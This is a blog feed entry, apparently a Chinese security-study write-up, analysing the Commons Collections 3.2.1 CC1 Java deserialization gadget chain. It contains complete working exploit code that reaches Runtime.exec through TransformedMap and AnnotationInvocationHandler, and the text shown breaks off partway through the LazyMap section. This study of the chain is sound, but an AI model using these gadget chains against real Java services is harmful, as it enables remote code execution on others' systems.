<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>p0l1st&#39;s blog</title>
  
  
  <link href="http://example.com/atom.xml" rel="self"/>
  
  <link href="http://example.com/"/>
  <updated>2024-08-30T15:32:26.843Z</updated>
  <id>http://example.com/</id>
  
  <author>
    <name>p0l1st</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>Java安全-Common-Collections 1利用链分析</title>
    <link href="http://example.com/2024/08/30/Java%E5%AE%89%E5%85%A8-Common-Collections-1%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/"/>
    <id>http://example.com/2024/08/30/Java%E5%AE%89%E5%85%A8-Common-Collections-1%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/</id>
    <published>2024-08-30T15:28:35.000Z</published>
    <updated>2024-08-30T15:32:26.843Z</updated>
    
    <content type="html"><![CDATA[<h1 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h1><ul><li>[JDK8u65][<a href="https://www.oracle.com/java/technologies/javase/javase8-archive-downloads.html]">https://www.oracle.com/java/technologies/javase/javase8-archive-downloads.html]</a></li><li>[openJDK 8u65][<a href="https://hg.openjdk.org/jdk8u/jdk8u/jdk/rev/af660750b2f4]">https://hg.openjdk.org/jdk8u/jdk8u/jdk/rev/af660750b2f4]</a></li><li>Maven3.6.3</li></ul><p>将jdk-af660750b2f4\src\share\classes\sun复制到jdk1.8.0_65\src</p><p><img src="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202408302329596.png" alt="QQ_1722596207037"></p><p>新建项目，将JDK换成8u65</p><p><img src="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202408302329071.png" alt="QQ_1724122490726"></p><p>然后在pom.xml添加依赖</p><pre><code> &lt;dependency&gt;            &lt;groupId&gt;commons-collections&lt;/groupId&gt;            &lt;artifactId&gt;commons-collections&lt;/artifactId&gt;            &lt;version&gt;3.2.1&lt;/version&gt; &lt;/dependency&gt;</code></pre><p><img src="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202408302329631.png" alt="QQ_1722598348232"></p><p>项目结构-&gt;SDK</p><p><img src="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202408302329404.png" alt="QQ_1722604414421"></p><p>然后</p><p><img src="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202408302329882.png" alt="QQ_1722599053594"></p><p>通过import CC的包来验证环境是否导入成功</p><pre><code class="java">import org.apache.commons.collections.functors.InvokerTransformer;</code></pre><h1 id="Common-Collections"><a href="#Common-Collections" class="headerlink" title="Common-Collections"></a>Common-Collections</h1><p>Apache Commons是Apache软件基金会的项目，曾经隶属于Jakarta项目。Commons的目的是提供可重用的、解决各种实际的通用问题且开源的Java代码。Commons由三部分组成:<code>Proper</code>(一些已发布项目)，<code>Sandbox</code>(一些正在开发的项目)和<code>Dormant</code>(一些刚启动或者已经停止维护的项目)。</p><blockquote><p>简单来说，Common-Collections这个项目开发出来是为了给Java标准的Collections API提供了相当好的补充</p><p>在此基础上对其常用的数据结构操作进行了很好的封装、抽象和补充</p></blockquote><h2 id="包结构"><a href="#包结构" class="headerlink" title="包结构"></a>包结构</h2><ul><li><code>org.apache.commons.collections</code>-CommonsCollections自定义的一组公用的接口和工具类</li><li><code>org.apache.commons.collections.bag</code>-实现Bag接口的一组类</li><li><code>org.apache.commons.collections.bidimap</code>-实现BidiMap系列接口的一组类</li><li><code>org.apache.commons.collections.buffer</code>-实现Buffer接口的一组类</li><li><code>org.apache.commons.collections.collection</code>-实现Java.util.Collection接口的一组类</li><li><code>org.apache.commons.collections.comparators</code>-实现Java.util.Comparator接口的一组类</li><li><code>org.apache.commons.collections.functors-Commons Collections</code>-自定义的一组功能组</li><li><code>org.apache.commons.collections.iterators</code>-实现Java.util.Iterator接口的一组类</li><li><code>org.apache.commons.collections.keyvalue</code>-实现集合和键&#x2F;值映射相关的一组类</li><li><code>org.apache.commons.collections.list</code>-实现java.util.list接口的一组类</li><li><code>org.apache.commons.collections.map</code>-实现Map系列接口的一组类</li><li><code>org.apache.commons.collections.set</code>-实现Set系列接口的一组类</li></ul><h1 id="TransformMap版CC1攻击链"><a href="#TransformMap版CC1攻击链" class="headerlink" title="TransformMap版CC1攻击链"></a>TransformMap版CC1攻击链</h1><p>反序列化攻击思路</p><p>入口类这里，需要一个<code>readObject</code>方法，结尾需要一个能够执行命令的方法，中间通过链子引导过去，所以攻击一定要从尾部出发取寻找头</p><p>流程图：</p><p><img src="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202408302329186.png" alt="QQ_1724120263339"></p><h2 id="寻找尾部的exec方法"><a href="#寻找尾部的exec方法" class="headerlink" title="寻找尾部的exec方法"></a>寻找尾部的exec方法</h2><p><code>Transfomer</code>接口，查看接口实现的类</p><p><img src="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202408302329605.png" alt="QQ_1724132888005"></p><p><code>InvokerTransformer</code>中存在反射可以调用任意类的任意方法，可以作为链子的终点</p><p><img src="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202408302329888.png" alt="QQ_1724133083887"></p><p>先尝试构造一下，利用这个类弹个计算器</p><p>反射的命令执行</p><pre><code class="java">package org.example;import org.apache.commons.collections.Transformer;import org.apache.commons.collections.functors.InvokerTransformer;import java.lang.reflect.InvocationTargetException;import java.lang.reflect.Method;public class Main &#123;    public static void main(String[] args) throws NoSuchMethodException, InvocationTargetException, IllegalAccessException &#123;        Runtime runtime = Runtime.getRuntime();        Class c = Runtime.class;        Method method = c.getDeclaredMethod(&quot;exec&quot;, String.class);        method.setAccessible(true);        method.invoke(runtime,&quot;calc&quot;);    &#125;&#125;</code></pre><p>根据构造方法构造exp，因为是public方法，无需反射</p><p><img src="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202408302329449.png" alt="QQ_1724133499724"></p><pre><code class="java">package org.example;import org.apache.commons.collections.Transformer;import org.apache.commons.collections.functors.InvokerTransformer;import java.lang.reflect.InvocationTargetException;import java.lang.reflect.Method;public class Main &#123;    public static void main(String[] args) throws NoSuchMethodException, InvocationTargetException, IllegalAccessException &#123;        Runtime runtime = Runtime.getRuntime();        InvokerTransformer invokerTransformer = new InvokerTransformer(&quot;exec&quot;,new Class[]&#123;String.class&#125;,new Object[]&#123;&quot;calc&quot;&#125;);        invokerTransformer.transform(runtime);    &#125;&#125;</code></pre><p><img src="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202408302329735.png" alt="QQ_1724133734478"></p><p>注意最后一句<code>invokerTransformer.transform(runtime);</code>，那么下一步就需要寻找调用<code>transform</code>方法的不同名函数</p><h2 id="初步寻找链子"><a href="#初步寻找链子" class="headerlink" title="初步寻找链子"></a>初步寻找链子</h2><p><code>find usages</code>发现<code>TransformedMap</code>类中存在<code>checkSetValue</code>方法调用了<code>transform</code>方法</p><p><img src="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202408302329542.png" alt="QQ_1724134789452"></p><p>跟进<code>valueTransformer</code>，在<code>TransformedMap</code>的构造方法发现了<code>valueTransformer</code></p><p><img src="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202408302329698.png" alt="QQ_1724141068529"></p><p>但是由于其作用域是protected，我们还要继续寻找谁又调用了这个构造方法</p><p>静态的<code>decorate</code>方法创建了<code>TransformedMap</code>对象</p><p><img src="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202408201606986.png" alt="QQ_1724141187145"></p><p>到这里，我们将其作为链子的起点，构造PoC</p><pre><code class="java">import org.apache.commons.collections.Transformer;import org.apache.commons.collections.functors.InvokerTransformer;import org.apache.commons.collections.map.TransformedMap;import java.lang.reflect.InvocationTargetException;import java.lang.reflect.Method;import java.util.HashMap;import java.util.Map;public class PoC1 &#123;    public static void main(String[] args) throws NoSuchMethodException, InvocationTargetException, IllegalAccessException &#123;        Runtime runtime = Runtime.getRuntime();        InvokerTransformer invokerTransformer = new InvokerTransformer(&quot;exec&quot;,new Class[]&#123;String.class&#125;,new Object[]&#123;&quot;calc&quot;&#125;);        HashMap&lt;Object,Object&gt; hashMap = new HashMap&lt;&gt;();        Map decorateMap = TransformedMap.decorate(hashMap,null,invokerTransformer);        Class&lt;TransformedMap&gt; transformedMapClass = TransformedMap.class;        Method checksetValueMethod = transformedMapClass.getDeclaredMethod(&quot;checkSetValue&quot;, Object.class);        checksetValueMethod.setAccessible(true);        checksetValueMethod.invoke(decorateMap,runtime);    &#125;&#125;</code></pre><p>分析一下这条链子是怎么构造的：</p><ul><li>尾部，也就是我们利用的漏洞，<code>InvokerTransformer</code>类的<code>transform</code>方法存在反射，可以进行命令执行</li><li>当调用<code>decorate</code>方法时，会新建<code>TransformedMap</code>对象，我们调用对象的<code>checkSetValue</code>方法</li><li>在<code>checkSetValue</code>方法中，会调用<code>transform</code>方法，这也就是链子的尾部</li></ul><p><img src="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202408302329243.png" alt="QQ_1724143647672"></p><p>这么一看，调用<code>decorate</code>方法就很有必要了，下面几行代码都是为了<code>decorate</code>方法而生的</p><pre><code class="java">InvokerTransformer invokerTransformer = new InvokerTransformer(&quot;exec&quot;,new Class[]&#123;String.class&#125;,new Object[]&#123;&quot;calc&quot;&#125;);HashMap&lt;Object,Object&gt; hashMap = new HashMap&lt;&gt;();Map decorateMap = TransformedMap.decorate(hashMap,null,invokerTransformer);</code></pre><p>调用完<code>decorate</code>方法，下面就可以新建<code>TransformedMap</code>对象了</p><pre><code class="java">Class&lt;TransformedMap&gt; transformedMapClass = TransformedMap.class;</code></pre><p>再利用反射</p><pre><code class="java">Method checksetValueMethod = transformedMapClass.getDeclaredMethod(&quot;checkSetValue&quot;, Object.class);checksetValueMethod.setAccessible(true);checksetValueMethod.invoke(decorateMap,runtime);</code></pre><p><img src="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202408302329106.png" alt="QQ_1724141830468"></p><h2 id="完整链子"><a href="#完整链子" class="headerlink" title="完整链子"></a>完整链子</h2><blockquote><p>目前的链子位于<code>checkSetValue</code>当中，找<code>decorate</code>的链子，发现无法往前了，回到<code>checkSetValue</code>重新找链子</p></blockquote><p>继续<code>find usages</code>，发现了<code>parent.checkSetValue(value)</code>，调用了<code>checkSetValue</code></p><p><img src="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202408302329169.png" alt="QQ_1724156707462"></p><p>跟进看看，这是一个抽象类，并且还是<code>TransformedMap</code>的父类</p><p><img src="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202408302329181.png" alt="QQ_1724156929399"></p><p>调用<code>checkSetValue</code>方法的是其内部类<code>MapEntry</code></p><p><img src="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202408302329045.png" alt="QQ_1724157040554"></p><p><code>setValue()</code>实际上就是再Map中对一组entry(键值对)进行<code>setValue()</code>操作</p><p><img src="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202408302329851.png" alt="QQ_1724157593945"></p><p>所以我们进行<code>decorate</code>方法调用，进行Map遍历时，就会走到<code>setValue</code>中，而<code>setValue</code>则会调用<code>checkSetValue</code></p><p>写一段代码来调试一下，看看遍历Map时，会不会走到<code>setValue</code>，在上图中<code>setValue</code>的第192行下断点</p><pre><code class="java">import org.apache.commons.collections.functors.InvokerTransformer;import org.apache.commons.collections.map.TransformedMap;import java.util.HashMap;import java.util.Map;public class setValueTest &#123;    public static void main(String[] args) &#123;        Runtime runtime =Runtime.getRuntime();        InvokerTransformer invokerTransformer = new InvokerTransformer(&quot;exec&quot;,new Class[]&#123;String.class&#125;,new Object[]&#123;&quot;calc&quot;&#125;);        HashMap&lt;Object,Object&gt; hashMap = new HashMap&lt;&gt;();        hashMap.put(&quot;key&quot;,&quot;value&quot;);        Map&lt;Object,Object&gt; decorateMap = TransformedMap.decorate(hashMap,null,invokerTransformer);        for (Map.Entry entry:decorateMap.entrySet())&#123;            entry.setValue(runtime);        &#125;    &#125;&#125;</code></pre><p>果然会跳进来，并且代码执行完会弹计算器</p><p><img src="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202408302329069.png" alt="QQ_1724158750153"></p><blockquote><p>那么到这里攻击思路就出来了，找到一个是数组的类，遍历这个数组，并且调用<code>setValue</code>方法</p></blockquote><p>问题是怎么遍历一个Map最终调用<code>setValue</code>方法</p><p>下面就需要找到一个可以调用<code>setValue</code>的<code>readObject</code></p><h2 id="寻找链首的readObject"><a href="#寻找链首的readObject" class="headerlink" title="寻找链首的readObject"></a>寻找链首的readObject</h2><p>之前链子分析到<code>setValue</code>，这里在<code>setValue</code>处继续find usages</p><p>成功找到一个<code>readObject</code>的入口类</p><p><img src="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202408302329577.png" alt="QQ_1724159597361"></p><p>类名为<code>AnnotationInvocationHandler</code>，<code>InvocationHandler</code>是用做动态代理中间处理，因为它继承了<code>InvocationHandler</code>接口</p><p>要调用<code>setValue</code>，就必须满足下图的条件</p><p><img src="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202408302329438.png" alt="QQ_1724160167995"></p><p>但是<code>readObject</code>的方法是类<code>AnnotationInvocationHandler</code>的，<code>AnnotationInvocationHandler</code>的作用域为default，我们需要通过反射来获取这个类及其构造函数，再实例化</p><p><img src="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202408302329140.png" alt="QQ_1724160425823"></p><h2 id="构造Exp"><a href="#构造Exp" class="headerlink" title="构造Exp"></a>构造Exp</h2><p>理想情况下的Exp</p><pre><code class="java">import org.apache.commons.collections.functors.InvokerTransformer;import org.apache.commons.collections.map.TransformedMap;import java.io.*;import java.lang.reflect.Constructor;import java.util.HashMap;import java.util.Map;public class ExceptedExp &#123;    public static void main(String[] args) throws Exception&#123;    Runtime runtime = Runtime.getRuntime();    InvokerTransformer invokerTransformer = new InvokerTransformer(&quot;exec&quot;, new Class[]&#123;String.class&#125;, new Object[]&#123;&quot;calc&quot;&#125;);    HashMap&lt;Object, Object&gt; hashMap = new HashMap&lt;&gt;();    hashMap.put(&quot;key&quot;, &quot;value&quot;);    Map&lt;Object, Object&gt; transformedMap = TransformedMap.decorate(hashMap, null, invokerTransformer);    Class c = Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;);    Constructor aihConstructor = c.getDeclaredConstructor(Class.class, Map.class);    aihConstructor.setAccessible(true);    Object o = aihConstructor.newInstance(Override.class, transformedMap);    // 序列化反序列化    serialize(o);    unserialize(&quot;ser.bin&quot;);&#125;public static void serialize(Object obj) throws IOException &#123;    ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(&quot;ser.bin&quot;));    oos.writeObject(obj);&#125;public static Object unserialize(String Filename) throws IOException, ClassNotFoundException&#123;    ObjectInputStream ois = new ObjectInputStream(new FileInputStream(Filename));    Object obj = ois.readObject();    return obj;&#125;&#125;</code></pre><p>这个Exp存在三个问题：</p><ul><li><code>Runtime</code>对象不可序列化，需要通过反射将其变成可以序列化的形式</li><li><code>setValue()</code>的传参，需要传<code>Runtime</code>对象，但是实际情况中却不是</li></ul><p><img src="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202408302329001.png" alt="QQ_1724161393851"></p><ul><li>要满足两个if条件才能调用<code>setValue</code></li></ul><h3 id="解决Runtime不能序列化"><a href="#解决Runtime不能序列化" class="headerlink" title="解决Runtime不能序列化"></a>解决Runtime不能序列化</h3><p><code>Runtime</code>没有实现序列化接口，因此不能序列化</p><p><img src="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202408302329306.png" alt="QQ_1724244641721"></p><p>但是<code>Runtime.class</code>是可以序列化的</p><blockquote><p><code>Runtime.class</code>是Java中的一个特殊的静态属性，表示<code>java.lang.Runtime</code>类的Class对象，对于<code>java.lang.Runtime</code>类来说，<code>Runtime.class</code>就是表示该类的元数据信息的Class对象。它包含了有关<code>Runtime</code>类的结构、方法、字段等信息，可以用来在反射中获取方法、调用方法、获取类名等</p></blockquote><p>先写一遍普通的反射</p><pre><code class="java">import java.lang.reflect.InvocationTargetException;import java.lang.reflect.Method;public class Exp1 &#123;    public static void main(String[] args) throws NoSuchMethodException, InvocationTargetException, IllegalAccessException &#123;        Class c = Runtime.class;        Method method = c.getDeclaredMethod(&quot;getRuntime&quot;);        Runtime runtime = (Runtime)method.invoke(null,null);        Method run = c.getMethod(&quot;exec&quot;, String.class);        run.invoke(runtime,&quot;calc&quot;);    &#125;&#125;</code></pre><p>再将这个反射的<code>Runtime</code>改为使用<code>InvokerTransformer</code>调用的方式</p><pre><code class="java">import org.apache.commons.collections.Transformer;import org.apache.commons.collections.functors.ChainedTransformer;import org.apache.commons.collections.functors.InvokerTransformer;import java.lang.reflect.InvocationTargetException;import java.lang.reflect.Method;public class Exp1 &#123;    public static void main(String[] args) throws NoSuchMethodException, InvocationTargetException, IllegalAccessException &#123;        Class c = Runtime.class;        Method runtimeMethod = (Method) new InvokerTransformer(&quot;getMethod&quot;,new Class[]&#123;String.class,Class[].class&#125;,new Object[]&#123;&quot;getRuntime&quot;,null&#125;).transform(c);        Runtime runtime = (Runtime) new InvokerTransformer(&quot;invoke&quot;,new Class[]&#123;Object.class,Object[].class&#125;,new Object[]&#123;null,null&#125;).transform(runtimeMethod);        new InvokerTransformer(&quot;exec&quot;,new Class[]&#123;String.class&#125;,new Object[]&#123;&quot;calc&quot;&#125;).transform(runtime);    &#125;&#125;</code></pre><p>最后三行代码的共同点：</p><ul><li>格式都为<code>new InvokerTransformer().invoke()</code></li><li>后一个<code>invoke()</code>方法里的参数都是前一个的结果</li></ul><p>我们可以使用<code>ChainedTransformer</code>类来简化代码</p><p><img src="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202408302329347.png" alt="QQ_1724166339028"></p><p><code>ChainedTransformer</code>类下的<code>transform</code>方法递归调用了前一个方法的结果，作为后一个方法的参数</p><p>那么编写Exp的时候就可以先定义一个数组，然后将数组传到<code>ChainedTransformer</code>中，再调用<code>transform</code>方法</p><pre><code class="java">import org.apache.commons.collections.Transformer;import org.apache.commons.collections.functors.ChainedTransformer;import org.apache.commons.collections.functors.InvokerTransformer;import java.lang.reflect.InvocationTargetException;import java.lang.reflect.Method;public class Exp1 &#123;    public static void main(String[] args) throws NoSuchMethodException, InvocationTargetException, IllegalAccessException &#123;        Transformer[] transformers = new Transformer[]&#123;                new InvokerTransformer(&quot;getMethod&quot;,new Class[]&#123;String.class,Class[].class&#125;,new Object[]&#123;&quot;getRuntime&quot;,null&#125;),                new InvokerTransformer(&quot;invoke&quot;,new Class[]&#123;Object.class,Object[].class&#125;,new Object[]&#123;null,null&#125;),                new InvokerTransformer(&quot;exec&quot;,new Class[]&#123;String.class&#125;,new Object[]&#123;&quot;calc&quot;&#125;)        &#125;;        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);        chainedTransformer.transform(Runtime.class);    &#125;&#125;</code></pre><p><img src="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202408302329370.png" alt="QQ_1724168176700"></p><p>与decorate的链子结合</p><pre><code class="java">import org.apache.commons.collections.Transformer;import org.apache.commons.collections.functors.InvokerTransformer;import org.apache.commons.collections.functors.ChainedTransformer;import org.apache.commons.collections.map.TransformedMap;import java.io.*;import java.lang.reflect.Constructor;import java.lang.reflect.InvocationTargetException;import java.util.HashMap;import java.util.Map;public class Exp2 &#123;    public static void main(String[] args) throws ClassNotFoundException, NoSuchMethodException, InvocationTargetException, InstantiationException, IllegalAccessException, IOException &#123;        Transformer[] transformers = new Transformer[]&#123;                new InvokerTransformer(&quot;getMethod&quot;                        , new Class[]&#123;String.class, Class[].class&#125;, new Object[]&#123;&quot;getRuntime&quot;, null&#125;),                new InvokerTransformer(&quot;invoke&quot;                        , new Class[]&#123;Object.class, Object[].class&#125;, new Object[]&#123;null, null&#125;),                new InvokerTransformer(&quot;exec&quot;                        , new Class[]&#123;String.class&#125;, new Object[]&#123;&quot;calc&quot;&#125;)        &#125;;        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);        HashMap&lt;Object, Object&gt; hashMap = new HashMap&lt;&gt;();        hashMap.put(&quot;key&quot;,&quot;value&quot;);        Map&lt;Object, Object&gt; transformedMap = TransformedMap.decorate(hashMap, null, chainedTransformer);        Class c = Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;);        Constructor aihConstructor = c.getDeclaredConstructor(Class.class, Map.class);        aihConstructor.setAccessible(true);        Object o = aihConstructor.newInstance(Override.class, transformedMap);        // 序列化反序列化          serialize(o);        unserialize(&quot;ser.bin&quot;);    &#125;    public static void serialize(Object obj) throws IOException &#123;        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(&quot;ser.bin&quot;));        oos.writeObject(obj);    &#125;    public static Object unserialize(String Filename) throws IOException, ClassNotFoundException&#123;        ObjectInputStream ois = new ObjectInputStream(new FileInputStream(Filename));        Object obj = ois.readObject();        return obj;    &#125;&#125;</code></pre><p>但是运行并没有弹出计算器，因为并没有调用<code>transformer</code></p><p>我们在<code>AnnotationInvocationHandler</code>类的两个if打断点看看</p><p><img src="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202408302329558.png" alt="QQ_1724168686951"></p><p><img src="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202408302329427.png" alt="QQ_1724168709732"></p><p>可以看到Exp跳过了第二个if，没有调用<code>setValue</code>方法</p><h3 id="进入setValue方法"><a href="#进入setValue方法" class="headerlink" title="进入setValue方法"></a>进入setValue方法</h3><p>要调用setValue方法，必须满足两个if条件</p><p>第一个if语句<code>if (memberType != null)</code>，跳出来的原因是我们传入的memberType为null，</p><p><img src="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202408302329380.png" alt="QQ_1724207333660"></p><p>我们的传参语句</p><p><img src="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202408302329302.png" alt="QQ_1724207473339"></p><p>我们的要求是，传入的注解参数是有成员变量的</p><p>并且满足<code>hashMap.put(&quot;para1&quot;,&quot;para2&quot;)</code>中的<code>para1</code>与成员变量相对应，当然这是第二个if的事了</p><p>跟进Override看看</p><p><img src="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202408302329256.png" alt="QQ_1724207957694"></p><p>什么都没有，那我们就需要找另外的注解</p><p>我们用<code>Target.class</code>尝试一下，点击<code>Target</code>，其中有一个成员变量<code>value</code>，所以这里的<code>hashmap.put</code>也需要修改为<code>value</code></p><p><img src="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202408302329279.png" alt="QQ_1724208750403"></p><p>再次debug，成功进入<code>setValue</code>方法</p><p><img src="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202408302329790.png" alt="QQ_1724208871994"></p><p>但是仍然弹不了计算器，因为<code>setValue</code>的值不可控，指定为<code>AnnotationTypeMismatchExceptionProxy</code>类，无法命令执行</p><p><img src="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202408302329942.png" alt="QQ_1724208977723"></p><p>我们需要找到一个类，可控<code>setValue</code>的参数</p><h3 id="编写最终Exp"><a href="#编写最终Exp" class="headerlink" title="编写最终Exp"></a>编写最终Exp</h3><p>这里找了一个能够解决<code>setValue</code>可控参数的类-<code>ConstantTransformer</code></p><p><img src="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202408302329096.png" alt="QQ_1724211692795"></p><ul><li>构造方法：传入的任何对象都放在<code>iConstant</code>中</li><li><code>transform()</code>方法：无论传入什么，都返回<code>iConstant</code></li></ul><p>那我们就可以将<code>AnnotationTypeMismatchExceptionProxy</code>类作为<code>transform</code>方法的参数传入，然后再通过构造方法传入<code>Runtime.class</code>，这样无论<code>transform</code>方法调用什么对象，都会返回<code>Runtime.class</code></p><p>我们来传入Runtime.class调试一下看看：</p><p><img src="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202408302329885.png" alt="QQ_1724221053295"></p><p><img src="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202408302329726.png" alt="QQ_1724221129619"></p><p><img src="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202408302329744.png" alt="QQ_1724221197402"></p><p>可以看到虽然给<code>transform</code>方法传入的参数是<code>AnnotationTypeMismatchExceptionProxy</code>，但是最终返回的是<code>Runtime.class</code></p><p>最终Exp</p><pre><code class="java">import org.apache.commons.collections.Transformer;import org.apache.commons.collections.functors.ChainedTransformer;import org.apache.commons.collections.functors.ConstantTransformer;import org.apache.commons.collections.functors.InvokerTransformer;import org.apache.commons.collections.map.TransformedMap;import java.io.*;import java.lang.annotation.Target;import java.lang.reflect.Constructor;import java.util.HashMap;import java.util.Map;public class ExpFinal &#123;    public static void main(String[] args) throws Exception&#123;        Transformer[] transformers = new Transformer[]&#123;                new ConstantTransformer(Runtime.class), // 构造 setValue 的可控参数                new InvokerTransformer(&quot;getMethod&quot;,                        new Class[]&#123;String.class, Class[].class&#125;, new Object[]&#123;&quot;getRuntime&quot;, null&#125;),                new InvokerTransformer(&quot;invoke&quot;                        , new Class[]&#123;Object.class, Object[].class&#125;, new Object[]&#123;null, null&#125;),                new InvokerTransformer(&quot;exec&quot;, new Class[]&#123;String.class&#125;, new Object[]&#123;&quot;calc&quot;&#125;)        &#125;;        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);        HashMap&lt;Object, Object&gt; hashMap = new HashMap&lt;&gt;();        hashMap.put(&quot;value&quot;,&quot;p0l1st&quot;);        Map&lt;Object, Object&gt; transformedMap = TransformedMap.decorate(hashMap, null, chainedTransformer);        Class c = Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;);        Constructor aihConstructor = c.getDeclaredConstructor(Class.class, Map.class);        aihConstructor.setAccessible(true);        Object o = aihConstructor.newInstance(Target.class, transformedMap);        // 序列化反序列化        serialize(o);        unserialize(&quot;ser.bin&quot;);    &#125;    public static void serialize(Object obj) throws IOException &#123;        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(&quot;ser.bin&quot;));        oos.writeObject(obj);    &#125;    public static Object unserialize(String Filename) throws IOException, ClassNotFoundException&#123;        ObjectInputStream ois = new ObjectInputStream(new FileInputStream(Filename));        Object obj = ois.readObject();        return obj;    &#125;&#125;</code></pre><p><img src="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202408302329048.png" alt="QQ_1724212166724"></p><h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p><strong>利用链</strong></p><pre><code>利用链：InvokerTransformer#transformTransformedMap#checkSetValueAbstractInputCheckedMapDecorator#setValueAnnotationInvocationHandler#readObject工具类辅助利用链：ChainedTransformerConstantTransformerHashMap</code></pre><p><strong>流程图</strong></p><p><img src="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202408302329533.png" alt="QQ_1724226578803"></p><h1 id="LazyMap版CC1攻击链"><a href="#LazyMap版CC1攻击链" class="headerlink" title="LazyMap版CC1攻击链"></a>LazyMap版CC1攻击链</h1><h2 id="寻找链尾的exec方法"><a href="#寻找链尾的exec方法" class="headerlink" title="寻找链尾的exec方法"></a>寻找链尾的exec方法</h2><p>链子的尾部还是<code>InvokerTransformer</code>下的<code>transform</code>方法，继续find usages</p><p>这里选择<code>LazyMap</code>类的<code>get</code>方法，该方法调用了<code>transform</code>方法并且作用域为<code>public</code></p><p><img src="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202408302329191.png" alt="QQ_1724383565912"></p><p><img src="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202408302329395.png" alt="QQ_1724383750465"></p><h2 id="寻找链子"><a href="#寻找链子" class="headerlink" title="寻找链子"></a>寻找链子</h2><p>先来看看上图158行中的<code>factory</code>是什么</p><p><img src="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202408302329552.png" alt="QQ_1724384351607"></p><p><img src="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202408302329929.png" alt="QQ_1724384611841"></p><p>这里也有<code>decorate</code>方法，作用和<code>TransformMap</code>中的<code>decorate</code>方法一样，那我们就可以通过<code>decorate</code>方法来创建<code>LazyMap</code>对象进而控制<code>factory</code></p><p>构造Exp来看看</p><pre><code class="java">import org.apache.commons.collections.functors.InvokerTransformer;import org.apache.commons.collections.map.LazyMap;import java.util.HashMap;import java.util.Map;public class LazyExp1 &#123;    public static void main(String[] args) throws Exception &#123;        Runtime runtime = Runtime.getRuntime();        InvokerTransformer invokerTransformer = new InvokerTransformer(&quot;exec&quot;,new Class[]&#123;String.class&#125;,new Object[]&#123;&quot;calc&quot;&#125;);        HashMap &lt;Object,Object&gt; hashMap = new HashMap&lt;&gt;();        Map decorateMap = LazyMap.decorate(hashMap,invokerTransformer);        decorateMap.get(runtime);    &#125;&#125;</code></pre><p><img src="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202408302329046.png" alt="image-20240823211214353"></p><p>可以看到这条链是可以利用的，继续往前，最终要找到入口类的<code>readObject</code>方法</p><p>上面我们找到了<code>LazyMap</code>类的<code>get</code>方法，继续看看谁调用了<code>LazyMap.get()</code></p><p><img src="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202408302329474.png" alt="image-20240823205916331"></p><p><code>AnnotationInvocationHandler</code>类的<code>invoke</code>方法调用了<code>get</code>方法</p><p><img src="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202408302329784.png" alt="image-20240823210147732"></p><p>分析上条链子时我们知道<code>memberValues</code>可控，并且这个类存在<code>readObject</code>方法，那我们就可以将其作为入口类</p><h2 id="编写Exp"><a href="#编写Exp" class="headerlink" title="编写Exp"></a>编写Exp</h2><p>触发<code>invoke</code>方法，需要动态代理，一个类被动态代理之后，通过代理调用这个类的方法，就一定会调用<code>invoke</code>方法</p><p><img 